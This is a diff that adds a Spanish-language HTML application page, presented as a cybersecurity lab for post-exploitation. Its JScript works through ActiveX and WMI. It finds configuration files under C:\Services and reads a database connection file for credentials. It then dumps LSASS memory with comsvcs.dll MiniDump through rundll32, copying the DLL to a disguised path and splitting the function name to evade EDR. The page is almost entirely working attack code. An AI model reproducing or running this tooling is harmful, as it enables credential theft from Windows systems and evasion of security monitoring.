@@ -1,0 +1,123 @@
+<html>
+<head>
+<title>Auditoría de Sistemas - Escenario de Post-Explotación</title>
+<style>
+    body { background: #1a1a1a; color: #00ff00; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; }
+    h2, h4 { border-bottom: 1px solid #333; padding-bottom: 5px; color: #00ccff; }
+    .box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #222; border-radius: 5px; }
+    button { background: #0055aa; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; font-weight: bold; }
+    button:hover { background: #0077cc; }
+    textarea, input { background: #000; color: #0f0; border: 1px solid #444; padding: 5px; width: 100%; margin-top: 5px; }
+    #status { font-weight: bold; margin-top: 10px; }
+</style>
+
+<script language="JScript">
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    var shell = new ActiveXObject("WScript.Shell");
+
+    // 1. Buscador de ficheros .conf
+    function buscarConfiguraciones() {
+        var log = document.getElementById("log");
+        log.value = "Buscando en C:\\Services... (Puede tardar un poco)\n";
+        recorrerCarpeta("C:\\Services");
+        log.value += "\n--- Busqueda finalizada ---";
+    }
+
+    function recorrerCarpeta(ruta) {
+        try {
+            var carpeta = fso.GetFolder(ruta);
+            var archivos = new Enumerator(carpeta.Files);
+            for (; !archivos.atEnd(); archivos.moveNext()) {
+                if (archivos.item().Name.toLowerCase().indexOf(".conf") !== -1) {
+                    document.getElementById("log").value += archivos.item().Path + "\n";
+                }
+            }
+            var sub = new Enumerator(carpeta.SubFolders);
+            for (; !sub.atEnd(); sub.moveNext()) {
+                recorrerCarpeta(sub.item().Path);
+            }
+        } catch(e) {}
+    }
+
+    // 2. Leer el archivo encontrado
+    function leerSecreto() {
+        var path = document.getElementById("filepath").value;
+        try {
+            var f = fso.OpenTextFile(path, 1);
+            alert("CONTENIDO:\n\n" + f.ReadAll());
+            f.Close();
+        } catch(e) { alert("Error: No se pudo leer el archivo. Verifica la ruta."); }
+    }
+
+    // 3. Detectar PID de LSASS mediante WMI (No usa CMD)
+    function detectarLSASS() {
+        try {
+            var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+            var procs = wmi.ExecQuery("Select * from Win32_Process where Name = 'lsass.exe'");
+            var e = new Enumerator(procs);
+            if (!e.atEnd()) {
+                var p = e.item();
+                document.getElementById("pid_val").value = p.ProcessId;
+                document.getElementById("status").innerText = "LSASS Detectado (PID: " + p.ProcessId + ")";
+                document.getElementById("status").style.color = "#00ff00";
+            }
+        } catch(e) { alert("Error al acceder a WMI: " + e.message); }
+    }
+
+    // 4. DUMPEO SIGILOSO (Bypass EDR)
+    function ejecutarDumpBypass() {
+        var pid = document.getElementById("pid_val").value;
+        if (!pid) { alert("Detecta el PID primero."); return; }
+
+        var status = document.getElementById("status");
+        try {
+            var rutaOriginal = "C:\\Windows\\System32\\comsvcs.dll";
+            var rutaDisfrazada = "C:\\Users\\Public\\mssql_module.tmp";
+            var salidaDump = "C:\\Users\\Public\\system_diag.log";
+
+            // Copiar DLL para evadir monitoreo de ruta
+            if (!fso.FileExists(rutaDisfrazada)) {
+                fso.CopyFile(rutaOriginal, rutaDisfrazada);
+            }
+
+            // Ofuscación del nombre de la función
+            var func = "Mini" + "Dump";
+            
+            // Ejecución: rundll32.exe [DLL_TMP], MiniDump [PID] [SALIDA] full
+            var cmd = "rundll32.exe " + rutaDisfrazada + ", " + func + " " + pid + " " + salidaDump + " full";
+            
+            shell.Run(cmd, 0, false);
+            status.innerText = "Comando de volcado enviado. Revisa C:\\Users\\Public\\";
+            status.style.color = "orange";
+        } catch(e) {
+            alert("Error: " + e.message);
+        }
+    }
+</script>
+</head>
+
+<body>
+    <h2>Laboratorio de Ciberseguridad</h2>
+
+    <div class="box">
+        <h4>1. Enumeración de Ficheros (No CMD)</h4>
+        <button onclick="buscarConfiguraciones()">Escanear C:\Services</button>
+        <textarea id="log" rows="4"></textarea>
+    </div>
+
+    <div class="box">
+        <h4>2. Extracción de Credenciales</h4>
+        <input type="text" id="filepath" value="C:\Services\InternalApp\Config\db_connection.conf">
+        <button onclick="leerSecreto()">Leer Contenido</button>
+    </div>
+
+    <div class="box" style="border-color: #ff4444;">
+        <h4>3. Volcado LSASS (Bypass EDR)</h4>
+        <button onclick="detectarLSASS()">1. Detectar PID</button>
+        <input type="text" id="pid_val" style="width: 80px; text-align: center;" placeholder="PID">
+        <br><br>
+        <button onclick="ejecutarDumpBypass()" style="background: #aa0000;">2. Ejecutar Volcado Sigiloso</button>
+        <div id="status">Esperando...</div>
+    </div>
+</body>
+</html>
